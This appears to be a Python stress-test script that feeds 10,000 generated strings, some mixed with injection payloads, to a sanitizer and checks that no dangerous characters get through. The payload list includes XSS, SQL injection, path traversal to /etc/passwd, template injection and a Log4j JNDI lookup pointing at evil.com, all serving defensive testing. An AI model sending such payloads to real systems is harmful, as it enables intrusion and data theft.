import time
import sys
import os
import random
import string

# Add src to path
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'src'))

from core.security import Sanitizer

def generate_storm_data(count=10000):
    valid_chars = string.ascii_letters + string.digits + " |()- "
    injection_payloads = [
        "<script>alert(1)</script>",
        "DROP TABLE users;",
        "../../etc/passwd",
        "javascript:void(0)",
        "1 OR 1=1",
        "{{7*7}}",  # SSTI
        "${jndi:ldap://evil.com/a}", # Log4j
    ]
    
    data = []
    for _ in range(count):
        if random.random() < 0.8: # 80% valid
            length = random.randint(5, 50)
            item = "".join(random.choice(valid_chars) for _ in range(length))
            data.append(item)
        else: # 20% injection
            payload = random.choice(injection_payloads)
            # Mix payload with some valid chars
            prefix = "".join(random.choice(valid_chars) for _ in range(5))
            data.append(prefix + payload)
    return data

def run_storm():
    print("Generating 10k storm strings...")
    dataset = generate_storm_data(10000)
    
    print("Starting sanitization loop...")
    start_time = time.time()
    
    failures = []
    
    for i, raw_input in enumerate(dataset):
        sanitized = Sanitizer.clean_item_name(raw_input)
        
        # Validation check: Ensure no dangerous chars leaked through
        forbidden = ["<", ">", ";", "/", "\\", "{", "}", "$"]
        for bad_char in forbidden:
            if bad_char in sanitized:
                failures.append(f"FAlgoL: Input '{raw_input}' -> '{sanitized}' contains '{bad_char}'")
                break
                
    end_time = time.time()
    total_time = end_time - start_time
    latency_per_op = (total_time / len(dataset)) * 1000 # ms
    
    print(f"Processed {len(dataset)} items in {total_time:.4f}s")
    print(f"Latency: {latency_per_op:.4f} ms/op")
    
    if failures:
        print(f"\nCRITICAL SECURITY FAlgoLURES ({len(failures)}):")
        for f in failures[:5]:
            print(f)
        if len(failures) > 5:
            print(f"... and {len(failures) - 5} more.")
        sys.exit(1)
    else:
        print("\nSUCCESS: No injections passed sanitization.")

if __name__ == "__main__":
    run_storm()
